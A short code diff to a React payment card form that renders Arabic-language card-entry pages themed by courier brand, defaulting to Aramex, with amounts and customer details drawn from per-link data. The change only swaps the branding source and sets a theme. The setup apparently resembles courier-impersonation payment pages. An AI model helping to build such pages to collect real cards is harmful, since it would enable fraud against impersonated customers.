@@ -4,7 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { getServiceBranding } from "@/lib/serviceLogos";
+import { couriers } from "@/themes/themeConfig";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
 import { Shield, CreditCard, AlertCircle, ArrowLeft } from "lucide-react";
@@ -26,7 +26,7 @@ const PaymentCardForm = () => {
   const customerInfo = linkData?.payload?.customerInfo || {};
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const branding = couriers[serviceKey as keyof typeof couriers] || couriers.aramex;
   const shippingInfo = linkData?.payload as any;
 
   // Get amount from link data - ensure it's a number, handle all data types
@@ -144,6 +144,7 @@ const PaymentCardForm = () => {
       title="بيانات البطاقة"
       description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
       icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+      theme="day"
     >
       {/* Security Notice */}
       <div 
